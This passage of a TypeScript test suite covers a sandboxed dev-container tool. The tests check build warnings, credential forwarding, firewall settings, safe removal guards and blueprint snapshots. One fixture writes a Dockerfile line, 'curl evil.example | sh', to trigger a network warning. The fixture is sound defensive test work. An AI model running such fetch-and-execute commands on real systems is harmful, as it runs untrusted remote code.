      b.buildImage = async (tag, context, opts) => {
        warnings.push('<build>');
        return build(tag, context, opts);
      };
      await startContainer(b, options({ warn: m => warnings.push(m), defaultBranch: async () => defaultBranch }));
      return { warnings, built: b.methods().includes('buildImage') };
    };

    // Same context as the default branch: built quietly
    const same = await run('main');
    expect(same.built).toBe(true);
    expect(same.warnings).not.toContain(BUILD_NETWORK_WARNING);

    fs.writeFileSync(path.join(tmp, '.devcontainer', 'Dockerfile'), 'FROM node:22\nRUN curl evil.example | sh\n');
    git('commit', '-qam', 'changed');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');
    const changed = await run('origin/main');
    expect(changed.built).toBe(true);
    // Before the build starts
    expect(changed.warnings.indexOf(BUILD_NETWORK_WARNING)).toBeGreaterThan(-1);
    expect(changed.warnings.indexOf(BUILD_NETWORK_WARNING)).toBeLessThan(changed.warnings.indexOf('<build>'));
    // Default branch unknown: no comparison
    expect((await run(undefined)).warnings).not.toContain(BUILD_NETWORK_WARNING);
  });

  it('refuses a devcontainer image that runs as root', async () => {
    const b = backend();
    b.execResults.set('id -u', { exitCode: 0, stdout: '0\n' });
    const git = (...args: string[]) => execFileSync('git', args, { cwd: tmp, env: GIT_ENV });
    git('init', '-q');
    fs.writeFileSync(path.join(tmp, '.devcontainer.json'), '{ "image": "node:22" }');
    git('add', '.');
    git('commit', '-qm', 'dc');
    git('update-ref', `refs/remotes/origin/${BRANCH}`, 'HEAD');
    b.existingImages.add('node:22');
    await expect(startContainer(b, options())).rejects.toMatchObject({ code: 'image' });
    expect(b.callsOf('remove')).toHaveLength(1);
  });
});

describe('forwardedEnv', () => {
  const vars = { home: '/h' };

  it('forwards AWS keys only with Bedrock', () => {
    const host = { AWS_ACCESS_KEY_ID: 'a', AWS_SECRET_ACCESS_KEY: 's', AWS_SESSION_TOKEN: 't', AWS_PROFILE: 'p', AWS_REGION: 'us-east-1' };
    expect(forwardedEnv({}, host, vars)).toEqual({ AWS_REGION: 'us-east-1' });
    expect(forwardedEnv({}, { ...host, CLAUDE_CODE_USE_BEDROCK: '1' }, vars)).toEqual({
      CLAUDE_CODE_USE_BEDROCK: '1',
      AWS_REGION: 'us-east-1',
      AWS_ACCESS_KEY_ID: 'a',
      AWS_SECRET_ACCESS_KEY: 's',
      AWS_SESSION_TOKEN: 't',
      AWS_PROFILE: 'p',
    });
    expect(forwardedEnv({}, { ...host, CLAUDE_CODE_USE_BEDROCK: '0' }, vars)).not.toHaveProperty('AWS_ACCESS_KEY_ID');
  });

  it('passes NAME=value literally with variables and skips unset or empty names', () => {
    expect(forwardedEnv({ env: ['A=${home}/x', 'B', 'C', 'D=1=2'] }, { B: 'b', C: '' }, vars)).toEqual({ A: '/h/x', B: 'b', D: '1=2' });
  });
});

describe('firewallEnv', () => {
  it('firewall mode is allowlist only when allow is non-empty', () => {
    expect(firewallEnv({}, '', 'github.com', undefined)).toEqual({
      KUNJ_FW_MODE: 'default',
      KUNJ_FW_ALLOW_HOST: '0',
      KUNJ_FW_DOMAINS: '',
      KUNJ_FW_GITHUB: '1',
      KUNJ_FW_ORIGIN_HOST: 'github.com',
      KUNJ_FW_ORIGIN_PORT: '',
      KUNJ_FW_SUBNET: '',
    });
    expect(firewallEnv({}, '', 'example.com', undefined, 8443).KUNJ_FW_ORIGIN_PORT).toBe('8443');
    expect(firewallEnv({ network: { allow: [] } }, '', 'gitlab.com', undefined).KUNJ_FW_MODE).toBe('default');
    const env = firewallEnv({ network: { allow: ['npmjs.org'], allowHost: true } }, '10.0.0.0/24', 'gitlab.com', 'eu-west-1');
    expect(env).toMatchObject({
      KUNJ_FW_MODE: 'allowlist',
      KUNJ_FW_ALLOW_HOST: '1',
      KUNJ_FW_DOMAINS: 'npmjs.org bedrock-runtime.eu-west-1.amazonaws.com',
      KUNJ_FW_GITHUB: '0',
      KUNJ_FW_SUBNET: '10.0.0.0/24',
    });
  });
});

describe('remove', () => {
  const GUARD_KEY_PREFIX = 'sh -c ';

  function guardBackend(stdout: string, opts: { state?: ContainerInfo['state']; origin?: number } = {}): FakeBackend {
    const b = new FakeBackend();
    const fw = { KUNJ_FW_MODE: 'default', KUNJ_FW_ORIGIN_HOST: 'github.com' };
    b.existing = [info({
      state: opts.state ?? 'running',
      labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main', [LABEL.options]: JSON.stringify({ helperEnv: fw }) }),
    })];
    b.existingImages.add(NETHELPER_IMAGE(VERSION));
    const real = b.exec.bind(b);
    b.exec = async (id: string, cmd: string[], io?: ExecIO) => {
      const r = await real(id, cmd, io);
      if (cmd.join(' ').startsWith(GUARD_KEY_PREFIX)) return { exitCode: 0, stdout };
      if (cmd.includes('ls-remote')) return { exitCode: opts.origin ?? 0, stdout: '' };
      return r;
    };
    return b;
  }

  const CTX = { user: 'dev', kunjVersion: VERSION };
  const CLEAN = '@@refs\nrefs/heads/feature/x 0\n@@stash\n0\n@@stash-exit 0\n@@status\n# branch.oid abc\n# branch.head feature/x\n@@status-exit 0\n';

  it('remove guard will not restart a privileged container without allowPrivileged', async () => {
    const privileged = (state: 'exited' | 'running') => {
      const b = guardBackend(CLEAN, { state });
      b.existing[0].labels[LABEL.options] = JSON.stringify({ helperEnv: { KUNJ_FW_MODE: 'default', KUNJ_FW_ORIGIN_HOST: 'github.com' }, dind: 'privileged' });
      return b;
    };
    const stopped = privileged('exited');
    await expect(inspectForRemove(stopped, names, CTX)).rejects.toThrow(/allowPrivileged.*--force/s);
    await expect(removeContainer(stopped, names, { ...CTX, force: false, keepVolumes: false })).rejects.toThrow(/allowPrivileged/);
    expect(stopped.callsOf('start')).toEqual([]);
    expect(stopped.callsOf('remove')).toEqual([]);
    // Allowed again, or already running (nothing is started): the guard runs
    const allowed = privileged('exited');
    await expect(inspectForRemove(allowed, names, { ...CTX, allowPrivileged: true })).resolves.toMatchObject({ dirty: false });
    expect(allowed.callsOf('start')).toEqual([['main-id']]);
    await expect(inspectForRemove(privileged('running'), names, CTX)).resolves.toMatchObject({ dirty: false });
  });

  it('remove guard refuses on unpushed refs', async () => {
    const stdout = CLEAN.replace('@@stash', 'refs/heads/other 1\n@@stash');
    const b = guardBackend(stdout, { state: 'exited' });
    await expect(removeContainer(b, names, { force: false, keepVolumes: false, user: 'dev', kunjVersion: VERSION })).rejects.toThrow(/--force/);
    // Started behind a fresh helper, and nothing exec'd in it before the helper was ready
    expect(b.callsOf('start')).toEqual([['main-id']]);
    const helper = runSpecs(b)[0];
    expect(helper).toMatchObject({ name: names.helper, networkOf: 'main-id', env: { KUNJ_FW_MODE: 'default', KUNJ_FW_ORIGIN_HOST: 'github.com' } });
    const cmds = execCmds(b);
    expect(cmds[0]).toBe(READY);
    expect(cmds[1]).toMatch(/^sh -c /);
    // Put back the way it was
    expect(b.callsOf('stop')).toEqual([[names.helper], [names.container]]);
    expect(b.callsOf('remove')).toEqual([[{ containers: [names.helper] }]]);

    const guard = await inspectForRemove(guardBackend(stdout), names, CTX);
    expect(guard).toEqual({ unpushedRefs: ['refs/heads/other'], stashes: 0, dirty: false, originReachable: true });

    const forced = guardBackend(stdout);
    await removeContainer(forced, names, { force: true, keepVolumes: false, user: 'dev', kunjVersion: VERSION });
    expect(forced.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container],
      volumes: [names.workspaceVolume, names.homeVolume, names.dockerVolume],
      networks: [names.network],
    }]]);
  });

  it('removes a clean container and keeps volumes on request', async () => {
    const b = guardBackend(CLEAN);
    const guard = await removeContainer(b, names, { force: false, keepVolumes: true, user: 'dev', kunjVersion: VERSION });
    expect(guard).toEqual({ unpushedRefs: [], stashes: 0, dirty: false, originReachable: true });
    expect(b.callsOf('remove')).toEqual([[{ containers: [names.helper, names.container], volumes: [], networks: [names.network] }]]);
    expect(b.methods()).not.toContain('start');
  });

  it('remove guard fails closed when origin is unreachable', async () => {
    const b = guardBackend(CLEAN, { origin: 128 });
    await expect(removeContainer(b, names, { force: false, keepVolumes: false, user: 'dev', kunjVersion: VERSION })).rejects.toThrow(/origin.*--force/s);
    expect(b.methods()).not.toContain('remove');

    const hung = guardBackend(CLEAN);
    hung.hangOn.add('git -c core.fsmonitor=false -c core.hooksPath=/dev/null ls-remote --exit-code origin HEAD');
    const guard = await inspectForRemove(hung, names, CTX);
    expect(guard.originReachable).toBe(false);
  });

  it('counts stashes and tracked changes', async () => {
    const stdout = CLEAN.replace('@@stash\n0', '@@stash\n2').replace('@@status-exit', '1 .M N... 100644 100644 100644 a b src/x.ts\n@@status-exit');
    const guard = await inspectForRemove(guardBackend(stdout), names, CTX);
    expect(guard).toMatchObject({ stashes: 2, dirty: true });
  });

  it('fails closed when git stash or git status fails, or never reports', async () => {
    const stashFailed = await inspectForRemove(guardBackend(CLEAN.replace('@@stash-exit 0', '@@stash-exit 128')), names, CTX);
    expect(stashFailed.unreadable).toEqual(['stash']);
    expect(describeGuard(stashFailed)).toContain('git stash failed in the container, so it cannot be checked');

    const statusFailed = await inspectForRemove(guardBackend(CLEAN.replace('@@status-exit 0', '@@status-exit 128')), names, CTX);
    expect(statusFailed).toMatchObject({ dirty: true, unreadable: ['status'] });

    // Cut short: neither section reported its exit code
    const cut = await inspectForRemove(guardBackend('@@refs\nrefs/heads/feature/x 0\n@@stash\n'), names, CTX);
    expect(cut).toMatchObject({ dirty: true, unreadable: ['stash', 'status'] });
    await expect(removeContainer(guardBackend('@@refs\n'), names, { force: false, keepVolumes: false, user: 'dev', kunjVersion: VERSION })).rejects.toThrow(/--force/);
  });

  it('counts a detached HEAD and a ref whose rev-list failed as unpushed', async () => {
    const stdout = CLEAN.replace('@@stash', 'HEAD 2\nrefs/heads/broken \n@@stash');
    const guard = await inspectForRemove(guardBackend(stdout), names, CTX);
    expect(guard.unpushedRefs).toEqual(['HEAD', 'refs/heads/broken']);
  });

  it('treats only a leading @@none as never cloned', async () => {
    const tricky = CLEAN.replace('@@status\n', '@@status\n1 .M N... 100644 100644 100644 a b @@none\n');
    expect((await inspectForRemove(guardBackend(tricky), names, CTX)).dirty).toBe(true);
    expect(await inspectForRemove(guardBackend('@@none\n'), names, CTX)).toEqual({ unpushedRefs: [], stashes: 0, dirty: false, originReachable: true });
  });

  it('runs every guard git command with fsmonitor and hooks off', async () => {
    const b = guardBackend(CLEAN);
    await inspectForRemove(b, names, CTX);
    const script = (b.callsOf('exec')[0][1] as string[])[2];
    const gitCalls = script.match(/(?<![.\w-])git [^|;}\n]*/g) ?? [];
    expect(gitCalls.length).toBeGreaterThan(4);
    for (const call of gitCalls) expect(call).toContain('git -c core.fsmonitor=false -c core.hooksPath=/dev/null');
  });

  it('refuses to start a stopped container with no recorded firewall settings', async () => {
    const b = guardBackend(CLEAN, { state: 'exited' });
    b.existing[0].labels = labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main' });
    await expect(inspectForRemove(b, names, CTX)).rejects.toThrow(/firewall/);
    expect(b.methods()).not.toContain('start');
  });
});

describe('stopContainer', () => {
  it('stops the helper and the container', async () => {
    const b = new FakeBackend();
    await stopContainer(b, names);
    expect(b.callsOf('stop')).toEqual([[names.helper], [names.container]]);
  });
});

describe('containerStatus', () => {
  const STATUS_CMD = (b: FakeBackend) => (b.callsOf('exec')[0][1] as string[]).join(' ');

  it('status times out per container', async () => {
    const b = new FakeBackend();
    b.hangOn.add('__hang__');
    const status = await containerStatus(b, 'id', 'dev');
    expect(status).toEqual({ agentRunning: null, head: null, ahead: null, dirty: null, status: 'timeout' });
    expect((b.callsOf('exec')[0][2] as ExecIO).timeoutMs).toBe(2000);
  });

  it('status distinguishes no tmux session from exec failure', async () => {
    const b = new FakeBackend();
    await containerStatus(b, 'id', 'dev');
    const key = STATUS_CMD(b);

    b.execResults.set(key, { exitCode: 0, stdout: 'tmux=1\n# branch.oid abc123\n# branch.head x\n# branch.upstream origin/x\n# branch.ab +3 -0\n' });
    expect(await containerStatus(b, 'id', 'dev')).toEqual({ agentRunning: false, head: 'abc123', ahead: 3, dirty: false, status: 'ok' });

    b.execResults.set(key, { exitCode: 0, stdout: 'tmux=0\n# branch.oid abc123\n? new.txt\n' });
    expect(await containerStatus(b, 'id', 'dev')).toEqual({ agentRunning: true, head: 'abc123', ahead: null, dirty: true, status: 'ok' });

    b.execErrors.set(key, new Error('docker exec failed: something broke'));
    expect(await containerStatus(b, 'id', 'dev')).toEqual({ agentRunning: null, head: null, ahead: null, dirty: null, status: 'error' });

    b.execErrors.set(key, new Error('docker exec failed: Error response from daemon: container abc is not running'));
    expect((await containerStatus(b, 'id', 'dev')).status).toBe('stopped');
  });
});

describe('blueprint start', () => {
  const PRESETS: Preset[] = [{ name: 'apt', path: '/presets/apt.sh', source: 'builtin', text: 'kunj_done 1\n', hash: 'p1' }];
  const SEED_COPY = "cp -a '/opt/kunj/seed/.' /workspace/";

  function blueprint(over: Record<string, unknown> = {}): ResolvedBlueprint {
    const text = JSON.stringify({ tools: { apt: ['jq'] }, setup: ['yarn install --immutable', 'yarn build'], maintain: ['yarn install'], ...over });
    return { blueprint: parseBlueprint(text, 'blueprint.json'), source: 'host', path: 'blueprint.json', text };
  }

  // cwd is not a git repository, so there are no lockfile ids
  function hashOf(r: ResolvedBlueprint): string {
    return blueprintHash({ text: r.text, lockfiles: [], baseImage: SANDBOX_IMAGE(VERSION), presetHashes: ['p1'] });
  }

  function snapshot(hash: string, createdAt: string, user = 'dev'): ImageInfo {
    return {
      tag: snapshotTag(REPO.name, hash),
      id: `img-${hash}`,
      createdAt,
      labels: { [LABEL.repo]: REPO.id, [LABEL.blueprintHash]: hash, [LABEL.blueprintUser]: user },
      size: 1,
    };
  }

  function bpOptions(over: Partial<StartOptions> = {}): StartOptions & { warnings: string[] } {
    const warnings: string[] = [];
    return { ...options({ blueprint: blueprint(), presets: PRESETS, warn: m => warnings.push(m), ...over }), warnings };
  }

  const seedScriptOf = (b: FakeBackend) => execCmds(b).find(c => c.startsWith('sh -c set -e')) ?? '';
  const presetExecs = (b: FakeBackend) => b.callsOf('exec').filter(a => (a[1] as string[]).join(' ').includes('/tmp/kunj-presets'));
  const lcExecs = (b: FakeBackend) => b.callsOf('exec').filter(a => (a[1] as string[])[1] === '-lc');

  it('uses the snapshot and copies the seed (no clone)', async () => {
    const r = blueprint();
    const b = backend();
    b.images = [snapshot(hashOf(r), '2026-10-20T10:00:00Z', 'node')];
    const opts = bpOptions({ blueprint: r });
    const result = await startContainer(b, opts);

    const [main] = runSpecs(b);
    expect(main.image).toBe(snapshotTag(REPO.name, hashOf(r)));
    expect(main.user).toBe('node');
    expect(main.volumes).toContainEqual({ name: names.homeVolume, path: '/home/node' });
    expect(JSON.parse(main.labels[LABEL.options])).toMatchObject({ imageKind: 'blueprint', blueprintHash: hashOf(r), user: 'node' });
    const script = seedScriptOf(b);
    expect(script).toContain(SEED_COPY);
    expect(script).not.toContain('git clone');
    expect(script).toContain(`git remote set-url origin '${REPO.originUrl}'`);
    // The snapshot holds the presets and setup; maintain still runs
    expect(presetExecs(b)).toEqual([]);
    expect(lcExecs(b).map(a => (a[1] as string[])[2])).toEqual(['yarn install']);
    expect(opts.warnings).toEqual([]);
    expect(result.blueprint).toEqual({
      hash: hashOf(r),
      snapshot: snapshotTag(REPO.name, hashOf(r)),
      stale: false,
      toolsRun: [],
      setupRan: false,
      maintainRan: true,
    });
  });

  it('stale snapshot used with one hint', async () => {
    const b = backend();
    b.images = [
      snapshot('aaaaaaaaaaaa', '2026-10-01T10:00:00.123456789Z'),
      snapshot('bbbbbbbbbbbb', '2026-10-21T10:00:00.123456789Z'),
      { ...snapshot('cccccccccccc', '2026-10-22T10:00:00Z'), tag: 'kunj-blueprint-other:cccccccccccc' },
    ];
    const opts = bpOptions();
    const result = await startContainer(b, opts);
    expect(runSpecs(b)[0].image).toBe(snapshotTag(REPO.name, 'bbbbbbbbbbbb'));
    expect(opts.warnings).toEqual([STALE_SNAPSHOT_HINT]);
    expect(seedScriptOf(b)).toContain(SEED_COPY);
    expect(presetExecs(b)).toEqual([]);
    expect(result.blueprint).toMatchObject({ snapshot: snapshotTag(REPO.name, 'bbbbbbbbbbbb'), stale: true, setupRan: false });
  });

  it('--no-snapshot ignores it', async () => {
    const r = blueprint();
    const b = backend();
    b.images = [snapshot(hashOf(r), '2026-10-20T10:00:00Z')];
    b.execResults.set('cat /tmp/kunj-presets/apt.result', { exitCode: 0, stdout: 'apt 1\n' });
    const opts = bpOptions({ blueprint: r, noSnapshot: true });
    const result = await startContainer(b, opts);
    expect(runSpecs(b)[0].image).toBe(SANDBOX_IMAGE(VERSION));
    expect(b.methods()).not.toContain('listImages');
    expect(seedScriptOf(b)).toContain('git clone');
    expect(opts.warnings).toEqual([]);
    expect(result.blueprint).toMatchObject({ hash: hashOf(r), snapshot: null, stale: false, toolsRun: ['apt'], setupRan: true, maintainRan: false });
  });

  it('maintain still runs after presets when there is no setup', async () => {
    const b = backend();
    const result = await startContainer(b, bpOptions({ blueprint: blueprint({ setup: [] }), noSnapshot: true }));
    expect(lcExecs(b).map(a => (a[1] as string[])[2])).toEqual(['yarn install']);
    expect(result.blueprint).toMatchObject({ toolsRun: ['apt'], setupRan: false, maintainRan: true });
  });

  it('snapshotHandled: no stale or no-snapshot hint (the command already reported it)', async () => {
    const stale = backend();
    stale.images = [snapshot('bbbbbbbbbbbb', '2026-10-21T10:00:00Z')];
    const o1 = bpOptions({ snapshotHandled: true });
    await startContainer(stale, o1);
    expect(runSpecs(stale)[0].image).toBe(snapshotTag(REPO.name, 'bbbbbbbbbbbb'));
    expect(o1.warnings).toEqual([]);

    const none = backend();
    none.execResults.set('cat /tmp/kunj-presets/apt.result', { exitCode: 0, stdout: 'apt 1\n' });
    const o2 = bpOptions({ snapshotHandled: true });
    const result = await startContainer(none, o2);
    expect(o2.warnings).toEqual([]);
    expect(result.blueprint).toMatchObject({ snapshot: null, setupRan: true });
  });

  it('resolves the working tree blueprint first when worktreeRoot is given', async () => {
    const wt = path.join(tmp, 'wt');
    fs.mkdirSync(path.join(wt, '.kunj'), { recursive: true });
    fs.writeFileSync(path.join(wt, '.kunj', 'blueprint.json'), JSON.stringify({ setup: ['make wt'] }));
    fs.mkdirSync(path.join(tmp, 'kunj'), { recursive: true });
    fs.writeFileSync(path.join(tmp, 'kunj', 'blueprint.json'), JSON.stringify({ setup: ['make host'] }));
    const b = backend();
    await startContainer(b, options({ presets: [], worktreeRoot: wt }));
    expect(execCmds(b)).toContain('sh -lc make wt');
    expect(execCmds(b)).not.toContain('sh -lc make host');
  });

  it('without snapshot runs presets as root then setup as the sandbox user, in order, after keep files', async () => {
    fs.mkdirSync(keepDir, { recursive: true });
    fs.writeFileSync(path.join(keepDir, '.env'), 'A=1\n');
    keptFiles = ['.env'];
    const b = backend();
    const opts = bpOptions();
    const result = await startContainer(b, opts);
    expect(opts.warnings).toContain('No blueprint snapshot yet; running tools and setup in the container (kunj ct blueprint snapshot makes this instant)');

    const cmds = execCmds(b);
    const seedAt = cmds.findIndex(c => c.startsWith('sh -c set -e'));
    const keepAt = cmds.findIndex(c => c.includes('tar -xf') && c.endsWith(' /workspace'));
    const presetsAt = cmds.findIndex(c => c.includes('/tmp/kunj-presets'));
    const order = ['sh -lc yarn install --immutable', 'sh -lc yarn build'].map(c => cmds.indexOf(c));
    expect(seedAt).toBeGreaterThan(-1);
    expect(keepAt).toBeGreaterThan(seedAt);
    expect(presetsAt).toBeGreaterThan(keepAt);
    expect(order[0]).toBeGreaterThan(presetsAt);
    expect(order[1]).toBeGreaterThan(order[0]);
    // setup just installed the dependencies, so maintain is skipped in the same run
    expect(cmds).not.toContain('sh -lc yarn install');
    for (const a of presetExecs(b)) expect((a[2] as ExecIO).user).toBe('root');
    expect(result.blueprint).toEqual({ hash: hashOf(blueprint()), snapshot: null, stale: false, toolsRun: ['apt'], tools: [{ name: 'apt', version: '' }], setupRan: true, maintainRan: false });
  });

  it('a kept workspace volume (seed marker present) still gets presets and setup in a new container', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.volumes.add(names.workspaceVolume);
    const result = await startContainer(b, bpOptions());
    expect(result.seeded).toBe(false);
    expect(seedScriptOf(b)).toBe('');
    expect(presetExecs(b).length).toBeGreaterThan(0);
    expect(execCmds(b)).toContain('sh -lc yarn build');
    expect(result.blueprint).toMatchObject({ toolsRun: ['apt'], setupRan: true });
  });

  it('the no-snapshot hint names only what will run', () => {
    expect(noSnapshotHint({ tools: {}, setup: ['make'] })).toBe(
      'No blueprint snapshot yet; running setup in the container (kunj ct blueprint snapshot makes this instant)'
    );
    expect(noSnapshotHint({ tools: { apt: ['jq'] }, setup: [] })).toContain('running tools in the container');
    expect(noSnapshotHint({ tools: {}, setup: [] })).not.toContain('running');
  });

  it('reads lockfiles for the hash at origin/<default> for a host blueprint', async () => {
    const b = backend();
    // A repository whose origin/main has a lockfile the working tree's HEAD does not
    const repoDir = path.join(tmp, 'repo');
    fs.mkdirSync(repoDir);
    execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: repoDir, env: GIT_ENV });
    fs.writeFileSync(path.join(repoDir, 'yarn.lock'), 'lock');
    execFileSync('git', ['add', 'yarn.lock'], { cwd: repoDir, env: GIT_ENV });
    execFileSync('git', ['commit', '-qm', 'lock'], { cwd: repoDir, env: GIT_ENV });
    execFileSync('git', ['update-ref', 'refs/remotes/origin/main', 'HEAD'], { cwd: repoDir, env: GIT_ENV });
    execFileSync('git', ['checkout', '-q', '--orphan', 'other'], { cwd: repoDir, env: GIT_ENV });
    execFileSync('git', ['rm', '-qf', 'yarn.lock'], { cwd: repoDir, env: GIT_ENV });
    execFileSync('git', ['commit', '-q', '--allow-empty', '-m', 'empty'], { cwd: repoDir, env: GIT_ENV });
    const r = blueprint({ lockfiles: ['yarn.lock'] });
    const result = await startContainer(b, bpOptions({ blueprint: r, cwd: repoDir, defaultBranch: async () => 'main' }));
    const blob = execFileSync('git', ['rev-parse', 'origin/main:yarn.lock'], { cwd: repoDir, encoding: 'utf8' }).trim();
    expect(result.blueprint?.hash).toBe(
      blueprintHash({ text: r.text, lockfiles: [{ path: 'yarn.lock', id: blob }], baseImage: SANDBOX_IMAGE(VERSION), presetHashes: ['p1'] })
    );
  });

  it('records the same hash planSnapshot computes for the same inputs', async () => {
    const b = backend();
    const repoDir = path.join(tmp, 'repo');
    fs.mkdirSync(repoDir);
    execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: repoDir, env: GIT_ENV });
    fs.writeFileSync(path.join(repoDir, 'yarn.lock'), 'lock');
    execFileSync('git', ['add', 'yarn.lock'], { cwd: repoDir, env: GIT_ENV });
    execFileSync('git', ['commit', '-qm', 'lock'], { cwd: repoDir, env: GIT_ENV });
    execFileSync('git', ['update-ref', 'refs/remotes/origin/main', 'HEAD'], { cwd: repoDir, env: GIT_ENV });
    const r = blueprint({ lockfiles: ['yarn.lock'] });
    // Real presets on both sides: the start resolves them itself, as planSnapshot does
    const opts = bpOptions({ blueprint: r, presets: undefined, cwd: repoDir, defaultBranch: async () => 'main' });
    await startContainer(b, opts);
    const main = runSpecs(b).find(s => s.name === names.container)!;
    const recorded = JSON.parse(main.labels[LABEL.options]).blueprintHash;

    const plan = await planSnapshot({
      branch: 'main',
      blueprint: r,
      config: opts.config,
      repo: REPO,
      kunjVersion: VERSION,
      cwd: repoDir,
      jsonMode: false,
      warn: () => {},
    });
    expect(recorded).toMatch(/^[0-9a-f]{12}$/);
    expect(recorded).toBe(plan.hash);
  });

  it('setup runs as the sandbox user', async () => {
    const b = backend();
    await startContainer(b, bpOptions());
    const lc = lcExecs(b);
    expect(lc).toHaveLength(2);
    for (const a of lc) expect(a[2]).toMatchObject({ user: 'dev', workdir: '/workspace' });
  });

  it('setup failure → StartError code setup and rollback', async () => {
    const b = backend();
    b.execResults.set('sh -lc yarn build', { exitCode: 2, stdout: '' });
    const err = await startContainer(b, bpOptions()).catch(e => e);
    expect(err).toBeInstanceOf(StartError);
    expect(err).toMatchObject({ code: 'setup', message: 'setup command failed (exit 2): yarn build' });
    expect(b.callsOf('remove')).toEqual([[{
      containers: [names.helper, names.container],
      volumes: [names.workspaceVolume, names.homeVolume],
      networks: [names.network],
    }]]);
    // Stopped at the first failure: maintain never ran
    expect(execCmds(b)).not.toContain('sh -lc yarn install');
  });

  it('an unknown preset fails the start with code setup', async () => {
    const b = backend();
    const err = await startContainer(b, bpOptions({ presets: undefined, blueprint: blueprint({ tools: { nosuch: true } }) })).catch(e => e);
    expect(err).toMatchObject({ code: 'setup', message: expect.stringContaining('Unknown preset "nosuch"') });
    expect(b.methods()).not.toContain('run');
  });

  it('maintain runs on resume and warns on failure', async () => {
    const b = backend();
    b.execResults.set(MARKER, { exitCode: 0, stdout: '' });
    b.execResults.set('sh -lc yarn install', { exitCode: 1, stdout: '' });
    const recorded = { user: 'dev', imageKind: 'blueprint', blueprintHash: 'abc' };
    b.existing = [info({ state: 'exited', image: 'kunj-blueprint-app:abc', labels: labelsFor(REPO.id, BRANCH, { [LABEL.role]: 'main', [LABEL.options]: JSON.stringify(recorded) }) })];
    const opts = bpOptions({ blueprint: blueprint({ maintain: ['yarn install', 'never reached'] }) });
    const result = await startContainer(b, opts);
    expect(result.created).toBe(false);
    expect(lcExecs(b).map(a => (a[1] as string[])[2])).toEqual(['yarn install']);
    expect(lcExecs(b)[0][2]).toMatchObject({ user: 'dev', workdir: '/workspace' });
    expect(presetExecs(b)).toEqual([]);
    expect(opts.warnings).toEqual(['maintain command failed (exit 1): yarn install']);
    expect(result.blueprint).toEqual({ hash: 'abc', snapshot: 'kunj-blueprint-app:abc', toolsRun: [], setupRan: false, maintainRan: true });
  });

  it('resolves the host blueprint when none is passed, and starts as before without one', async () => {
    const b = backend();
    const plain = await startContainer(b, options());
    expect(plain.blueprint).toBeUndefined();
    expect(execCmds(b).some(c => c.startsWith('sh -lc'))).toBe(false);

    fs.mkdirSync(path.join(tmp, 'kunj'), { recursive: true });
    fs.writeFileSync(path.join(tmp, 'kunj', 'blueprint.json'), JSON.stringify({ setup: ['make'] }));
    const b2 = backend();
    const result = await startContainer(b2, options({ presets: [] }));
    expect(execCmds(b2)).toContain('sh -lc make');
    expect(result.blueprint).toMatchObject({ setupRan: true, maintainRan: false });
  });

  it('namesFor names and labels the container while the clone checks out the branch', async () => {
    const b = backend();
    await startContainer(b, bpOptions({ namesFor: 'main@snapshot', branch: 'main', noSnapshot: true }));
    const snapNames = containerNames(REPO.name, REPO.id, 'main@snapshot');
    const [main] = runSpecs(b);
    expect(main.name).toBe(snapNames.container);
    expect(main.labels[LABEL.branch]).toBe('main@snapshot');
    expect(seedScriptOf(b)).toContain("git switch 'main'");
    expect(main.env).toMatchObject({ KUNJ_BRANCH: 'main', KUNJ_REPO: REPO.name });
  });
});

describe('findSnapshot', () => {
  const img = (tag: string, hash: string, createdAt: string): ImageInfo => ({
    tag, id: tag, createdAt, size: 0, labels: { [LABEL.repo]: REPO.id, [LABEL.blueprintHash]: hash, [LABEL.blueprintUser]: 'dev' },
  });

  it('findSnapshot picks exact hash, else newest as stale', async () => {
    const b = new FakeBackend();
    expect(await findSnapshot(b, 'app', REPO.id, 'h1')).toBeNull();
    b.images = [
      img('kunj-blueprint-app:h1', 'h1', '2026-10-01T00:00:00Z'),
      img('kunj-blueprint-app:h2', 'h2', '2026-10-03T00:00:00Z'),
      img('kunj-blueprint-app:h3', 'h3', '2026-10-02T00:00:00Z'),
      img('kunj-blueprint-application:h9', 'h9', '2026-10-09T00:00:00Z'),
      { ...img('kunj-blueprint-app:h8', 'h8', '2026-10-08T00:00:00Z'), labels: { [LABEL.repo]: 'other/repo' } },
    ];
    expect(await findSnapshot(b, 'app', REPO.id, 'h1')).toEqual({ tag: 'kunj-blueprint-app:h1', user: 'dev', stale: false });
    expect(await findSnapshot(b, 'app', REPO.id, 'zz')).toEqual({ tag: 'kunj-blueprint-app:h2', user: 'dev', stale: true });
    expect(b.callsOf('listImages')[0]).toEqual([{ [LABEL.repo]: REPO.id }]);
  });
});

describe('baseImageTag', () => {
  it('is the image a start resolves without a snapshot: the setting, else the sandbox', async () => {
    await expect(baseImageTag(options())).resolves.toBe(SANDBOX_IMAGE(VERSION));
    await expect(baseImageTag(options({ config: { container: { image: 'my/img:1' } } as KunjConfig }))).resolves.toBe('my/img:1');
  });
});

describe('services', () => {
  const PG = `${names.container}-svc-postgres`;
  const PG_DATA = `${PG}-data`;
  const SERVICES = { postgres: { image: 'postgres:16-alpine', env: { POSTGRES_PASSWORD: 'dev' }, healthcheck: 'pg_isready', port: 5432, volumes: { data: '/var/lib/postgresql/data' } } };

  function svcOptions(over: Partial<StartOptions> = {}): StartOptions {
    return options({ config: { container: { services: SERVICES } } as unknown as KunjConfig, ...over });
  }

  function svcInfo(state: ContainerInfo['state']): ContainerInfo {
    return info({
      id: 'pg-id',
      name: PG,
      state,
      image: 'postgres:16-alpine',
      labels: labelsFor(REPO.id, BRANCH, {
        [LABEL.role]: 'service',
        [LABEL.service]: 'postgres',
        [LABEL.options]: JSON.stringify({ port: 5432, healthcheck: 'pg_isready', volumes: [PG_DATA] }),
      }),
    });
  }

  it('start: services run (and pass their health check) before the branch container, without host env', async () => {
    const b = backend();
    const result = await startContainer(b, svcOptions());
    const specs = runSpecs(b);
    expect(specs.map(s => s.name)).toEqual([PG, names.container, names.helper]);
    const pg = specs[0];
    expect(pg.env).toEqual({ POSTGRES_PASSWORD: 'dev' });
    expect(pg.network).toBe(names.network);
    expect(pg.aliases).toEqual(['postgres']);
    expect(pg.volumes).toEqual([{ name: PG_DATA, path: '/var/lib/postgresql/data' }]);
    expect(pg.capabilities).toBeUndefined();
    expect(pg.publish).toEqual([]);
    const m = b.methods();
